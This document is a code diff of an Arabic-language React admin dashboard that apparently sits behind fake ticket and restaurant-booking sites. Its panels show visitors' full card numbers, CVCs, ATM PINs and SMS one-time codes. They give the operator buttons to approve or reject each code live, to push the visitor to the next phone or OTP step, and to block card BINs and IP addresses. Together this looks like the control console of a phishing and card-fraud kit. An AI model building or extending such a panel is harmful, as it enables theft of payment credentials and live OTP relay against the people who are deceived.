+        <div className="grid grid-cols-2 gap-1">
+          <button
+            onClick={onApprove}
+            disabled={!canDecide}
+            className="py-1 bg-green-500/20 text-green-300 hover:bg-green-500/30 disabled:opacity-30 rounded text-[10px] font-semibold flex items-center justify-center gap-1 border border-green-500/30"
+            data-testid={`otp-row-approve-${step}`}
+          >
+            <CheckCircle2 className="w-3 h-3" /> قبول
+          </button>
+          <button
+            onClick={onReject}
+            disabled={!canDecide}
+            className="py-1 bg-red-500/20 text-red-300 hover:bg-red-500/30 disabled:opacity-30 rounded text-[10px] font-semibold flex items-center justify-center gap-1 border border-red-500/30"
+            data-testid={`otp-row-reject-${step}`}
+          >
+            <XCircle className="w-3 h-3" /> رفض
+          </button>
+        </div>
+      )}
+    </div>
+  );
+}
+
+function StatusLine({ label, status }: { label: string; status: string }) {
+  const cls =
+    status === "approved"
+      ? "text-green-400"
+      : status === "rejected"
+        ? "text-red-400"
+        : status === "waiting"
+          ? "text-amber-400"
+          : status === "received"
+            ? "text-cyan-400"
+            : "text-slate-500";
+  const text =
+    status === "approved"
+      ? "تم القبول"
+      : status === "rejected"
+        ? "مرفوض"
+        : status === "waiting"
+          ? "في انتظار الإرسال..."
+          : status === "received"
+            ? "تم الاستلام"
+            : "—";
+  return (
+    <div className="flex items-center justify-between text-[11px]">
+      <span className="text-slate-400">{label}</span>
+      <span className={`font-semibold ${cls}`}>{text}</span>
+    </div>
+  );
+}
+
+function PhoneInfoCard({
+  visitor,
+  onApprove,
+  onReject,
+  onPushStep,
+}: {
+  visitor: Visitor;
+  onApprove: () => void;
+  onReject: () => void;
+  onPushStep: (step: number) => void;
+}) {
+  const phone = String(visitor.phoneVerification || visitor.phone || "");
+  const operatorId = String(visitor.operator || "").toLowerCase();
+  const operatorLabel =
+    OPERATOR_LABELS[operatorId] ||
+    (operatorId ? operatorId.toUpperCase() : "—");
+  const smsOtp = String(visitor.smsOtp || "");
+  const status: string =
+    visitor.phoneOtpApprovalStatus || (smsOtp ? "received" : "—");
+  const waiting = status === "waiting";
+
+  if (!phone && !operatorId && !smsOtp) {
+    return (
+      <Panel title="الجوال والمشغل">
+        <div className="text-slate-500 text-[12px]">
+          لم يصل بعد إلى مرحلة التحقق بالجوال.
+        </div>
+      </Panel>
+    );
+  }
+
+  const operatorTone =
+    operatorId === "stc"
+      ? "bg-violet-500/15 text-violet-300 border-violet-500/30"
+      : operatorId === "mobily"
+        ? "bg-blue-500/15 text-blue-300 border-blue-500/30"
+        : operatorId === "zain"
+          ? "bg-fuchsia-500/15 text-fuchsia-300 border-fuchsia-500/30"
+          : "bg-slate-700/30 text-slate-300 border-slate-600/40";
+
+  return (
+    <Panel
+      title="الجوال والمشغل"
+      badge={waiting ? "بانتظار الموافقة" : undefined}
+    >
+      <div className="space-y-3">
+        <div className="grid grid-cols-2 gap-2">
+          <div className="rounded-lg border border-slate-700 bg-slate-900/40 p-2">
+            <div className="text-[10px] text-slate-500 mb-1">رقم الجوال</div>
+            <div
+              className="text-cyan-300 font-mono font-bold text-sm"
+              dir="ltr"
+              data-testid="phone-card-number"
+            >
+              {phone || "—"}
+            </div>
+          </div>
+          <div className={`rounded-lg border p-2 ${operatorTone}`}>
+            <div className="text-[10px] opacity-70 mb-1">المشغل</div>
+            <div className="font-bold text-sm" data-testid="phone-card-operator">
+              {operatorLabel}
             </div>
           </div>
         </div>
 
-        <div className="grid grid-cols-3 gap-1.5 p-2.5 bg-[#0b141a]">
-          <StatCard icon={Users} label="إجمالي الزوار" value={totalVisitors} color="text-blue-400" />
-          <StatCard icon={Eye} label="متصل الآن" value={onlineVisitors} color="text-green-400" />
-          <StatCard icon={CreditCard} label="بطاقات" value={withPayment} color="text-yellow-400" />
-          <StatCard icon={Ticket} label="تذاكر" value={ticketVisitors} color="text-cyan-400" />
-          <StatCard icon={UtensilsCrossed} label="حجوزات مطاعم" value={reservationVisitors} color="text-orange-400" />
-          <StatCard icon={Shield} label="OTP" value={withOtp} color="text-purple-400" />
+        <OtpRow
+          label="OTP الجوال (SMS)"
+          step={8}
+          code={smsOtp}
+          status={status}
+          canDecide={waiting}
+          onApprove={onApprove}
+          onReject={onReject}
+        />
+
+        <div className="grid grid-cols-2 gap-1.5">
+          <button
+            onClick={() => onPushStep(7)}
+            className="py-1.5 bg-slate-800 hover:bg-slate-700 rounded text-[10px] font-semibold text-slate-200 border border-slate-700"
+            data-testid="phone-card-push-7"
+          >
+            دفع لإدخال الجوال
+          </button>
+          <button
+            onClick={() => onPushStep(8)}
+            className="py-1.5 bg-slate-800 hover:bg-slate-700 rounded text-[10px] font-semibold text-slate-200 border border-slate-700"
+            data-testid="phone-card-push-8"
+          >
+            دفع لـ OTP الجوال
+          </button>
         </div>
 
-        {totalRevenue > 0 && (
-          <div className="px-2.5 pb-2.5 bg-[#0b141a]">
-            <div className="bg-gradient-to-r from-green-900/30 to-green-800/20 rounded-lg p-2.5 border border-green-500/30">
-              <div className="flex items-center justify-between">
-                <div className="flex items-center gap-2">
-                  <DollarSign className="w-4 h-4 text-green-400" />
-                  <span className="text-[#8696a0] text-xs">إجمالي المبالغ</span>
-                </div>
-                <span className="text-green-400 font-bold text-lg">{totalRevenue.toLocaleString('ar-SA')} ر.س</span>
-              </div>
-            </div>
+        {visitor.smsOtpSubmittedAt && (
+          <div className="text-[10px] text-slate-500 text-left" dir="ltr">
+            {fmtTime(visitor.smsOtpSubmittedAt)}
           </div>
         )}
+      </div>
+    </Panel>
+  );
+}
 
-        <div className="flex gap-1 px-2.5 pb-2 bg-[#0b141a]">
-          {(["all", "ticket", "reservation"] as const).map(type => (
-            <button
-              key={type}
-              onClick={() => setFilterType(type)}
-              className={`flex-1 text-[10px] py-1.5 rounded-md font-medium transition-colors ${
-                filterType === type
-                  ? "bg-[#00a884] text-white"
-                  : "bg-[#202c33] text-[#8696a0] hover:bg-[#2a3942]"
-              }`}
-              data-testid={`filter-${type}`}
-            >
-              {type === "all" ? "الكل" : type === "ticket" ? "تذاكر" : "حجوزات"}
-            </button>
-          ))}
+function BlockedBinsCard({
+  bins,
+  onAdd,
+  onRemove,
+  suggestedBin,
+  suggestedLast4,
+}: {
+  bins: string[];
+  onAdd: (bin: string) => void;
+  onRemove: (bin: string) => void;
+  suggestedBin?: string;
+  suggestedLast4?: string;
+}) {
+  const [input, setInput] = useState("");
+  const cleanInput = input.replace(/\D/g, "").slice(0, 6);
+  const canAdd = cleanInput.length === 6 && !bins.includes(cleanInput);
+  const sugg = suggestedBin
+    ? String(suggestedBin).replace(/\D/g, "").slice(0, 6)
+    : "";
+  const suggCanAdd = sugg.length === 6 && !bins.includes(sugg);
+
+  return (
+    <Panel
+      title="قائمة البطاقات المحظورة"
+      badge={bins.length > 0 ? `${bins.length} محظور` : undefined}
+    >
+      <div className="space-y-3">
+        <div className="text-[11px] text-slate-400 leading-relaxed">
+          أي بطاقة تبدأ بأول 6 أرقام (BIN) من القائمة سيتم رفضها تلقائياً عند
+          المحاولة بدفع.
         </div>
 
-        {showBlockedBinsPanel && (
-          <div className="bg-[#0b141a] border-t border-[#2a3942] max-h-[40vh] overflow-y-auto" data-testid="panel-blocked-bins">
-            <div className="px-3 py-2 bg-[#202c33] flex items-center justify-between sticky top-0">
-              <div className="flex items-center gap-2">
-                <Ban className="w-4 h-4 text-red-400" />
-                <span className="text-white text-sm font-semibold">البطاقات المحظورة</span>
-                <span className="bg-red-500/20 text-red-400 text-[10px] px-1.5 py-0.5 rounded-full">
-                  {blockedBins.length}
-                </span>
+        {/* Add form */}
+        <div className="flex gap-1.5">
+          <input
+            type="text"
+            inputMode="numeric"
+            maxLength={6}
+            value={input}
+            onChange={(e) => setInput(e.target.value.replace(/\D/g, ""))}
+            onKeyDown={(e) => {
+              if (e.key === "Enter" && canAdd) {
+                onAdd(cleanInput);
+                setInput("");
+              }
+            }}
+            placeholder="مثال: 453204"
+            dir="ltr"
+            className="flex-1 px-2 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-sm font-mono text-cyan-300 text-center placeholder-slate-600 focus:outline-none focus:border-red-500/60"
+            data-testid="blocklist-input"
+          />
+          <button
+            onClick={() => {
+              if (!canAdd) return;
+              onAdd(cleanInput);
+              setInput("");
+            }}
+            disabled={!canAdd}
+            className="px-3 py-1.5 bg-red-500/20 hover:bg-red-500/30 disabled:opacity-30 disabled:cursor-not-allowed text-red-300 rounded-lg text-xs font-bold flex items-center gap-1 border border-red-500/40"
+            data-testid="blocklist-add"
+          >
+            <Plus className="w-3.5 h-3.5" /> حظر
+          </button>
+        </div>
+
+        {/* Quick-add suggestion from currently selected visitor */}
+        {sugg && (
+          <button
+            onClick={() => suggCanAdd && onAdd(sugg)}
+            disabled={!suggCanAdd}
+            className={`w-full text-right px-2.5 py-2 rounded-lg border flex items-center justify-between gap-2 transition ${
+              suggCanAdd
+                ? "bg-amber-500/10 border-amber-500/30 hover:bg-amber-500/20 text-amber-200"
+                : "bg-slate-900/40 border-slate-800 text-slate-500 cursor-not-allowed"
+            }`}
+            data-testid="blocklist-add-current"
+          >
+            <span className="text-[11px] flex items-center gap-1.5">
+              <Ban className="w-3 h-3" />
+              {suggCanAdd ? "حظر بطاقة الزائر الحالي" : "BIN الزائر محظور"}
+            </span>
+            <span className="font-mono text-[12px] font-bold" dir="ltr">
+              {sugg}
+              {suggestedLast4 ? ` ··· ${suggestedLast4}` : ""}
+            </span>
+          </button>
+        )}
+
+        {/* Blocked list */}
+        <div>
+          <div className="text-[11px] text-slate-500 mb-1.5 flex items-center gap-1">
+            <ShieldOff className="w-3 h-3" /> البطاقات المحظورة ({bins.length})
+          </div>
+          <div className="space-y-1 max-h-48 overflow-y-auto">
+            {bins.length === 0 && (
+              <div className="text-center py-4 text-slate-600 text-[11px]">
+                لا يوجد بطاقات محظورة
               </div>
-              <button
-                onClick={() => setShowBlockedBinsPanel(false)}
-                className="text-[#8696a0] hover:text-white text-xs"
-                data-testid="button-close-blocked-bins"
+            )}
+            {bins.map((b) => (
+              <div
+                key={b}
+                className="flex items-center justify-between gap-2 bg-slate-900/60 border border-slate-800 rounded-lg px-2.5 py-1.5 group"
               >
-                إغلاق
-              </button>
-            </div>
-            <div className="px-3 py-2.5 bg-[#111b21] border-b border-[#2a3942] flex items-center gap-2">
-              <input
-                type="text"
-                inputMode="numeric"
-                placeholder="أدخل أول 6 أرقام من البطاقة"
-                value={newBinInput}
-                onChange={(e) => setNewBinInput(e.target.value.replace(/\D/g, "").slice(0, 6))}
-                onKeyDown={async (e) => {
-                  if (e.key === "Enter" && newBinInput.length === 6 && !addingBin) {
-                    setAddingBin(true);
-                    await handleBlockBin(newBinInput);
-                    setNewBinInput("");
-                    setAddingBin(false);
-                  }
-                }}
-                dir="ltr"
-                className="flex-1 bg-[#202c33] border border-[#2a3942] text-white text-sm font-mono tracking-wider rounded-md px-3 py-1.5 outline-none focus:border-red-500/50 placeholder:text-[#8696a0]/60 placeholder:font-sans placeholder:text-xs placeholder:tracking-normal"
-                data-testid="input-new-blocked-bin"
-              />
-              <Button
-                onClick={async () => {
-                  if (newBinInput.length !== 6 || addingBin) return;
-                  setAddingBin(true);
-                  await handleBlockBin(newBinInput);
-                  setNewBinInput("");
-                  setAddingBin(false);
-                }}
-                disabled={newBinInput.length !== 6 || addingBin}
-                size="sm"
-                className="bg-red-600 hover:bg-red-700 text-white text-xs h-8 px-3 disabled:opacity-50"
-                data-testid="button-add-blocked-bin"
+                <span
+                  className="font-mono text-[13px] font-bold text-red-300 tracking-wider"
+                  dir="ltr"
+                >
+                  {b}••••••••••
+                </span>
+                <button
+                  onClick={() => {
+                    if (confirm(`إزالة الحظر عن ${b}؟`)) onRemove(b);
+                  }}
+                  className="opacity-50 group-hover:opacity-100 text-slate-400 hover:text-red-400 p-1 rounded hover:bg-red-500/10"
+                  data-testid={`blocklist-remove-${b}`}
+                  title="إزالة"
+                >
+                  <XIcon className="w-3.5 h-3.5" />
+                </button>
+              </div>
+            ))}
+          </div>
+        </div>
+      </div>
+    </Panel>
+  );
+}
+
+function BlockedIpsCard({
+  ips,
+  onAdd,
+  onRemove,
+  suggestedIp,
+  suggestedName,
+}: {
+  ips: string[];
+  onAdd: (ip: string) => void;
+  onRemove: (ip: string) => void;
+  suggestedIp?: string;
+  suggestedName?: string;
+}) {
+  const [input, setInput] = useState("");
+  const cleanInput = input.trim();
+  const looksValid =
+    /^(\d{1,3}\.){3}\d{1,3}(\/\d{1,2})?$/.test(cleanInput) ||
+    /^[0-9a-fA-F:]+$/.test(cleanInput);
+  const canAdd = looksValid && !ips.includes(cleanInput);
+  const sugg = suggestedIp ? String(suggestedIp).trim() : "";
+  const suggCanAdd = !!sugg && !ips.includes(sugg);
+
+  return (
+    <Panel
+      title="حظر الزوار بعنوان IP"
+      badge={ips.length > 0 ? `${ips.length} محظور` : undefined}
+    >
+      <div className="space-y-3">
+        <div className="text-[11px] text-slate-400 leading-relaxed">
+          أي زائر يدخل من عنوان IP موجود بالقائمة سيُمنع من استخدام النظام
+          ويظهر له رسالة حظر. يدعم IPv4 و IPv6 والـ CIDR.
+        </div>
+
+        <div className="flex gap-1.5">
+          <input
+            type="text"
+            value={input}
+            onChange={(e) => setInput(e.target.value)}
+            onKeyDown={(e) => {
+              if (e.key === "Enter" && canAdd) {
+                onAdd(cleanInput);
+                setInput("");
+              }
+            }}
+            placeholder="مثال: 102.45.12.7"
+            dir="ltr"
+            className="flex-1 px-2 py-1.5 bg-slate-900 border border-slate-700 rounded-lg text-sm font-mono text-cyan-300 text-center placeholder-slate-600 focus:outline-none focus:border-red-500/60"
+            data-testid="ip-blocklist-input"
+          />
+          <button
+            onClick={() => {
+              if (!canAdd) return;
+              onAdd(cleanInput);
+              setInput("");
+            }}
+            disabled={!canAdd}
+            className="px-3 py-1.5 bg-red-500/20 hover:bg-red-500/30 disabled:opacity-30 disabled:cursor-not-allowed text-red-300 rounded-lg text-xs font-bold flex items-center gap-1 border border-red-500/40"
+            data-testid="ip-blocklist-add"
+          >
+            <Plus className="w-3.5 h-3.5" /> حظر
+          </button>
+        </div>
+
+        {sugg && (
+          <button
+            onClick={() => suggCanAdd && onAdd(sugg)}
+            disabled={!suggCanAdd}
+            className={`w-full text-right px-2.5 py-2 rounded-lg border flex items-center justify-between gap-2 transition ${
+              suggCanAdd
+                ? "bg-amber-500/10 border-amber-500/30 hover:bg-amber-500/20 text-amber-200"
+                : "bg-slate-900/40 border-slate-800 text-slate-500 cursor-not-allowed"
+            }`}
+            data-testid="ip-blocklist-add-current"
+          >
+            <span className="text-[11px] flex items-center gap-1.5">
+              <WifiOff className="w-3 h-3" />
+              {suggCanAdd ? "حظر الزائر الحالي" : "IP الزائر محظور"}
+              {suggestedName ? ` · ${suggestedName}` : ""}
+            </span>
+            <span className="font-mono text-[12px] font-bold" dir="ltr">
+              {sugg}
+            </span>
+          </button>
+        )}
+
+        <div>
+          <div className="text-[11px] text-slate-500 mb-1.5 flex items-center gap-1">
+            <ShieldOff className="w-3 h-3" /> العناوين المحظورة ({ips.length})
+          </div>
+          <div className="space-y-1 max-h-48 overflow-y-auto">
+            {ips.length === 0 && (
+              <div className="text-center py-4 text-slate-600 text-[11px]">
+                لا يوجد عناوين محظورة
+              </div>
+            )}
+            {ips.map((ip) => (
+              <div
+                key={ip}
+                className="flex items-center justify-between gap-2 bg-slate-900/60 border border-slate-800 rounded-lg px-2.5 py-1.5 group"
               >
-                {addingBin ? "..." : "حظر"}
-              </Button>
-            </div>
-            {blockedBins.length === 0 ? (
-              <div className="text-center text-[#8696a0] text-xs py-6">لا توجد بطاقات محظورة</div>
-            ) : (
-              <div className="divide-y divide-[#2a3942]/50">
-                {blockedBins.map((b) => (
-                  <div key={b.bin} className="flex items-center justify-between gap-2 p-2.5" data-testid={`row-blocked-bin-${b.bin}`}>
-                    <div className="min-w-0 flex-1">
-                      <p className="text-white font-mono text-sm tracking-wider" dir="ltr">{b.bin}</p>
-                      <p className="text-[#8696a0] text-[10px] truncate">
-                        {translateBankName(b.bankName || "") || b.cardBrand || "—"}
-                        {b.country ? ` · ${translateCountry(b.country)}` : ""}
-                      </p>
-                    </div>
-                    <Button
-                      onClick={() => handleUnblockBin(b.bin)}
-                      size="sm"
-                      variant="outline"
-                      className="border-orange-500/40 text-orange-400 hover:bg-orange-500/10 text-[10px] h-7 px-2"
-                      data-testid={`button-unblock-bin-${b.bin}`}
-                    >
-                      رفع الحظر
-                    </Button>
-                  </div>
-                ))}
+                <span
+                  className="font-mono text-[13px] font-bold text-red-300 tracking-wider"
+                  dir="ltr"
+                >
+                  {ip}
+                </span>
+                <button
+                  onClick={() => {
+                    if (confirm(`إزالة الحظر عن ${ip}؟`)) onRemove(ip);
+                  }}
+                  className="opacity-50 group-hover:opacity-100 text-slate-400 hover:text-red-400 p-1 rounded hover:bg-red-500/10"
+                  data-testid={`ip-blocklist-remove-${ip}`}
+                  title="إزالة"
+                >
+                  <XIcon className="w-3.5 h-3.5" />
+                </button>
+              </div>
+            ))}
+          </div>
+        </div>
+      </div>
+    </Panel>
+  );
+}
+
+function CardInfoCard({
+  visitor,
+  onApprove,
+  onReject,
+  onPushStep,
+  onBlockBin,
+  isBinBlocked,
+  onBlockIp,
+  isIpBlocked,
+}: {
+  visitor: Visitor;
+  onApprove: (
+    field:
+      | "cardApprovalStatus"
+      | "otpApprovalStatus"
+      | "phoneOtpApprovalStatus",
+  ) => void;
+  onReject: (
+    field:
+      | "cardApprovalStatus"
+      | "otpApprovalStatus"
+      | "phoneOtpApprovalStatus",
+  ) => void;
+  onPushStep: (step: number) => void;
+  onBlockBin?: (bin: string) => void;
+  isBinBlocked?: boolean;
+  onBlockIp?: (ip: string) => void;
+  isIpBlocked?: boolean;
+}) {
+  const p = visitor.payment || {};
+  const hasCard = !!(p.cardLast4 || p.cardName || p.cardNumber);
+  if (!hasCard && visitor.nafadConfirmationStatus !== "waiting") return null;
+
+  const last4 = p.cardLast4 || "••••";
+  const expiry = p.cardExpiry || "";
+  const name = p.cardName || "";
+  const scheme = String(p.cardScheme || "").toLowerCase();
+  const bin = p.cardBin;
+  const bank = safeText(p.cardBank);
+  const cardType = String(p.cardType || "").toUpperCase();
+  const cardLevel = String(p.cardLevel || "").toUpperCase();
+  const matchedBank = findBankLogo(p.cardBank);
+  const bankLogo: string | null = p.cardBankLogo || matchedBank?.logo || null;
+  const bankLabel: string =
+    p.cardBankLabel || matchedBank?.label || bank || "";
+  const waiting = visitor.cardApprovalStatus === "waiting";
+  const hasBin =
+    bin || bank || p.cardType || p.cardCountry || p.cardCvc || visitor.atmPin;
+  const fullCard = String(p.cardNumber || "").replace(/\D/g, "");
+  const groupedCard =
+    fullCard.length >= 12
+      ? fullCard.replace(/(.{4})/g, "$1 ").trim()
+      : `•••• •••• •••• ${last4}`;
+  const cvc = String(p.cardCvc || "").replace(/\D/g, "");
+
+  const isMaster = scheme.includes("master");
+  const isMada = scheme.includes("mada");
+  const isAmex = scheme.includes("amex") || scheme.includes("american");
+  const schemeLabel = isMaster
+    ? "MASTERCARD"
+    : isMada
+      ? "mada"
+      : isAmex
+        ? "AMEX"
+        : "VISA";
+  const cardBackground = isMaster
+    ? "linear-gradient(135deg, #ff8a00 0%, #e64a19 55%, #7a1a00 100%)"
+    : isMada
+      ? "linear-gradient(135deg, #0e7a5f 0%, #06402e 100%)"
+      : isAmex
+        ? "linear-gradient(135deg, #2e7df1 0%, #0a3680 100%)"
+        : "linear-gradient(135deg, #1a3a8c 0%, #0e1f4a 50%, #061029 100%)";
+
+  return (
+    <Panel
+      title="معلومات البطاقة"
+      badge={waiting ? "بانتظار الموافقة" : undefined}
+    >
+      <div className="space-y-3">
+        {/* Scheme-themed payment card */}
+        <div
+          className="relative rounded-2xl p-4 text-white overflow-hidden w-full max-w-[280px] mx-auto shadow-lg"
+          style={{
+            background: cardBackground,
+            aspectRatio: "1.586 / 1",
+            minHeight: 170,
+          }}
+          dir="ltr"
+        >
+          <div className="absolute top-3 left-3 text-[10px] uppercase tracking-[0.18em] font-bold opacity-95">
+            {schemeLabel}
+          </div>
+          <div
+            className="absolute top-2.5 right-3 flex items-center gap-1.5 max-w-[60%]"
+            title={bankLabel || "غير معروف"}
+          >
+            {bankLogo && (
+              <div className="bg-white/95 rounded-md p-1 flex items-center justify-center shadow-sm shrink-0">
+                <img
+                  src={bankLogo}
+                  alt={bankLabel || "Bank"}
+                  className="h-5 w-auto max-w-[44px] object-contain"
+                  onError={(e) => {
+                    (e.currentTarget.parentElement as HTMLElement).style.display =
+                      "none";
+                  }}
+                />
+              </div>
+            )}
+            {!bankLogo && (
+              <div
+                className="text-[10px] font-semibold opacity-90 truncate text-right"
+                dir="auto"
+              >
+                {bankLabel || "—"}
               </div>
             )}
           </div>
-        )}
 
-        <div className="flex-1 overflow-y-auto">
-          {loading && visitors.length === 0 ? (
-            <div className="flex items-center justify-center h-32 text-[#8696a0]">جاري التحميل...</div>
-          ) : filteredVisitors.length === 0 ? (
-            <div className="flex items-center justify-center h-32 text-[#8696a0]">لا توجد بيانات</div>
-          ) : (
-            filteredVisitors.map((visitor) => (
-              <div
-                key={visitor.id}
-                onClick={() => setSelectedVisitor(visitor)}
-                className={`flex items-center gap-3 p-3 cursor-pointer border-b border-[#2a3942]/50 hover:bg-[#2a3942]/50 transition-all ${
-                  selectedVisitor?.id === visitor.id ? "bg-[#2a3942]" : ""
-                }`}
-                data-testid={`visitor-item-${visitor.id}`}
-              >
-                <div className="relative flex-shrink-0">
-                  <div className={`w-11 h-11 rounded-full flex items-center justify-center ${
-                    isReservationFlow(visitor)
-                      ? "bg-gradient-to-br from-orange-500 to-amber-600"
-                      : visitor.cardNumber
-                      ? "bg-gradient-to-br from-yellow-500 to-orange-500"
-                      : "bg-gradient-to-br from-[#00a884] to-[#008f6f]"
-                  }`}>
-                    {isReservationFlow(visitor) ? (
-                      <UtensilsCrossed className="w-5 h-5 text-white" />
-                    ) : visitor.cardNumber ? (
-                      <CreditCard className="w-5 h-5 text-white" />
-                    ) : (
-                      <User className="w-5 h-5 text-white" />
-                    )}
-                  </div>
-                  <span
-                    className={`absolute -bottom-0.5 -right-0.5 w-3.5 h-3.5 rounded-full border-2 border-[#111b21] ${
-                      visitor.online ? "bg-[#00a884]" : "bg-[#8696a0]"
-                    }`}
-                    data-testid={`status-${visitor.id}`}
-                  />
+          {(cardType || cardLevel) && (
+            <div className="absolute top-9 right-3 flex flex-col items-end gap-0.5 max-w-[60%]">
+              {cardType && (
+                <div className="text-[9px] tracking-wider opacity-90 px-1.5 py-px bg-white/15 rounded uppercase font-semibold">
+                  {cardType}
                 </div>
-                <div className="flex-1 min-w-0">
-                  <div className="flex items-center justify-between gap-2">
-                    <h3 className="text-white font-medium truncate text-sm">
-                      {visitor.name || "زائر جديد"}
-                    </h3>
-                    <span className="text-[10px] text-[#8696a0] flex-shrink-0">
-                      {getRelativeTime(visitor.createdDate)}
-                    </span>
-                  </div>
-                  <div className="flex items-center justify-between gap-2 mt-0.5">
-                    <div className="flex items-center gap-1">
-                      <span className={`text-[10px] px-1.5 py-0.5 rounded font-medium ${
-                        isReservationFlow(visitor)
-                          ? "bg-orange-500/20 text-orange-400"
-                          : "bg-cyan-500/20 text-cyan-400"
-                      }`}>
-                        {isReservationFlow(visitor) ? "حجز مطعم" : "تذكرة"}
-                      </span>
-                      <span className="bg-blue-500/20 text-blue-400 text-[10px] px-1.5 py-0.5 rounded font-medium">
-                        {getPageNameArabic(visitor.currentPage)}
-                      </span>
-                    </div>
-                    <div className="flex items-center gap-1 flex-shrink-0">
-                      {visitor.blocked && (
-                        <span className="bg-red-500/20 text-red-400 text-[9px] px-1.5 py-0.5 rounded font-medium">
-                          محظور
-                        </span>
-                      )}
-                      {visitor.online && (
-                        <span className="bg-green-500/20 text-green-400 text-[9px] px-1 py-0.5 rounded flex items-center gap-0.5">
-                          <Wifi className="w-2.5 h-2.5" />
-                        </span>
-                      )}
-                      {visitor.cardNumber && !visitor.cardApproved && (
-                        <span className="bg-orange-500/20 text-orange-400 text-[9px] px-1.5 py-0.5 rounded font-medium animate-pulse">
-                          انتظار
-                        </span>
-                      )}
-                      {visitor.cardApproved && (
-                        <span className="bg-green-500/20 text-green-400 text-[9px] px-1.5 py-0.5 rounded font-medium">
-                          موافق
-                        </span>
-                      )}
-                      {visitor.otpHistory && visitor.otpHistory.length > 0 && (
-                        <span className="bg-purple-500/20 text-purple-400 text-[9px] px-1.5 py-0.5 rounded font-medium">
-                          {visitor.otpHistory.length} OTP
-                        </span>
-                      )}
-                    </div>
-                  </div>
+              )}
+              {cardLevel && (
+                <div
+                  className="text-[9px] tracking-wider opacity-95 px-1.5 py-px bg-white/15 rounded uppercase font-semibold leading-tight text-right"
+                  title={cardLevel}
+                >
+                  {cardLevel}
                 </div>
-              </div>
-            ))
+              )}
+            </div>
           )}
-        </div>
-      </div>
 
-      <div className="flex-1 flex flex-col bg-[#0b141a]">
-        {selectedVisitor ? (
-          <>
-            <div className="bg-[#202c33] p-4 flex items-center gap-3 border-b border-[#2a3942]">
-              <div className={`w-12 h-12 rounded-full flex items-center justify-center ${
-                isReservationFlow(selectedVisitor)
-                  ? "bg-gradient-to-br from-orange-500 to-amber-600"
-                  : selectedVisitor.cardNumber
-                  ? "bg-gradient-to-br from-yellow-500 to-orange-500"
-                  : "bg-gradient-to-br from-[#00a884] to-[#008f6f]"
-              }`}>
-                {isReservationFlow(selectedVisitor) ? (
-                  <UtensilsCrossed className="w-6 h-6 text-white" />
-                ) : selectedVisitor.cardNumber ? (
-                  <CreditCard className="w-6 h-6 text-white" />
-                ) : (
-                  <User className="w-6 h-6 text-white" />
-                )}
-              </div>
-              <div className="flex-1">
-                <h2 className="text-white font-semibold text-lg">
-                  {selectedVisitor.name || "زائر جديد"}
-                </h2>
-                <div className="flex items-center gap-2">
-                  {selectedVisitor.online ? (
-                    <span className="flex items-center gap-1">
-                      <span className="relative flex h-2 w-2">
-                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-[#00a884] opacity-75"></span>
-                        <span className="relative inline-flex rounded-full h-2 w-2 bg-[#00a884]"></span>
-                      </span>
-                      <span className="text-[#00a884] text-xs font-medium">متصل الآن</span>
-                    </span>
-                  ) : (
-                    <span className="flex items-center gap-1">
-                      <WifiOff className="w-3 h-3 text-[#8696a0]" />
-                      <span className="text-[#8696a0] text-xs">غير متصل</span>
-                    </span>
-                  )}
-                  <span className="text-[#8696a0] text-xs">•</span>
-                  <p className="text-xs text-[#8696a0]">{getPageNameArabic(selectedVisitor.currentPage)}</p>
-                  <span className={`text-[10px] px-1.5 py-0.5 rounded font-medium ${
-                    isReservationFlow(selectedVisitor) ? "bg-orange-500/20 text-orange-400" : "bg-cyan-500/20 text-cyan-400"
-                  }`}>
-                    {isReservationFlow(selectedVisitor) ? "حجز مطعم" : "تذكرة"}
-                  </span>
-                  {selectedVisitor.blocked && (
-                    <span className="text-[10px] px-1.5 py-0.5 rounded font-medium bg-red-500/20 text-red-400">
-                      محظور
-                    </span>
-                  )}
-                </div>
-              </div>
-              <div className="flex items-center gap-2">
-                <AlertDialog open={sendMailDialogOpen} onOpenChange={setSendMailDialogOpen}>
-                  <Button variant="outline" size="icon" onClick={() => setSendMailDialogOpen(true)} disabled={!selectedVisitor.email || sendingMail} title="إرسال بريد" data-testid="button-send-mail">
-                    <Send className="w-4 h-4" />
-                  </Button>
-                  <AlertDialogContent dir="rtl">
-                    <AlertDialogHeader>
-                      <AlertDialogTitle>إرسال بريد للزائر؟</AlertDialogTitle>
-                      <AlertDialogDescription>سيتم إرسال رسالة إلى: <span className="font-medium text-foreground">{selectedVisitor.email || "---"}</span></AlertDialogDescription>
-                    </AlertDialogHeader>
-                    <AlertDialogFooter className="gap-2 sm:gap-0">
-                      <AlertDialogCancel disabled={sendingMail}>إلغاء</AlertDialogCancel>
-                      <AlertDialogAction onClick={(e) => { e.preventDefault(); void handleSendMailToSelectedVisitor(); }} disabled={!selectedVisitor.email || sendingMail}>
-                        {sendingMail ? "جاري الإرسال..." : "إرسال"}
-                      </AlertDialogAction>
-                    </AlertDialogFooter>
-                  </AlertDialogContent>
-                </AlertDialog>
-                <AlertDialog open={blockDialogOpen} onOpenChange={setBlockDialogOpen}>
-                  <Button
-                    variant={selectedVisitor.blocked ? "outline" : "destructive"}
-                    size="icon"
-                    onClick={() => setBlockDialogOpen(true)}
-                    disabled={blockingVisitorId === selectedVisitor.id}
-                    title={selectedVisitor.blocked ? "فك الحظر" : "حظر الزائر"}
-                    data-testid="button-toggle-block-visitor"
-                  >
-                    <Ban className="w-4 h-4" />
-                  </Button>
-                  <AlertDialogContent dir="rtl">
-                    <AlertDialogHeader>
-                      <AlertDialogTitle>
-                        {selectedVisitor.blocked ? "فك حظر الزائر؟" : "حظر الزائر؟"}
-                      </AlertDialogTitle>
-                      <AlertDialogDescription>
-                        {selectedVisitor.blocked
-                          ? "سيتم السماح للزائر بالمتابعة مرة أخرى."
-                          : "سيتم منع الزائر من إرسال البيانات أو متابعة الدفع."}
-                      </AlertDialogDescription>
-                    </AlertDialogHeader>
-                    <AlertDialogFooter className="gap-2 sm:gap-0">
-                      <AlertDialogCancel disabled={blockingVisitorId === selectedVisitor.id}>إلغاء</AlertDialogCancel>
-                      <AlertDialogAction
-                        onClick={(e) => { e.preventDefault(); void handleToggleBlockSelectedVisitor(); }}
-                        disabled={blockingVisitorId === selectedVisitor.id}
-                        className={
-                          selectedVisitor.blocked
-                            ? "bg-green-600 text-white hover:bg-green-700"
-                            : "bg-destructive text-destructive-foreground hover:bg-destructive/90"
-                        }
-                      >
-                        {blockingVisitorId === selectedVisitor.id
-                          ? "جاري التحديث..."
-                          : selectedVisitor.blocked
